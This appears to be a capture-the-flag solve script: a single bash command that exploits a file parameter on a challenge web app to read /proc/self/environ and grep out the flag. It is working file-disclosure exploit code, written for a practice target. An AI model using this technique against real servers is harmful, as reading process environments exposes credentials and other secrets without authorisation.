#!/bin/bash

curl -s https://simple-calculator.acmcyber.com/source\?file\=/proc/self/environ | strings |  grep flag | sed 's/.*\(flag{.*}\).*/\1/'
